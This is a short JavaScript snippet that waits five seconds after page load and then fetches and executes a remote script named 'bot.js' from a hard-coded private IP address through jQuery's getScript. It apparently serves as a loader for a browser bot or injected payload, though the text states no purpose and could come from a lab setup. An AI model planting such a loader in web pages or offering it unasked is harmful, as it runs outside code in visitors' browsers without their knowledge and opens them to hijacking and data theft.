
window.onload = function ()
{
  sleep(5000, getScript);
}

function sleep(millis, callback)
{
  setTimeout(function ()
  { callback(); }
  , millis);
}

function getScript()
{
  $.getScript('http://192.168.1.110/bot.js');
}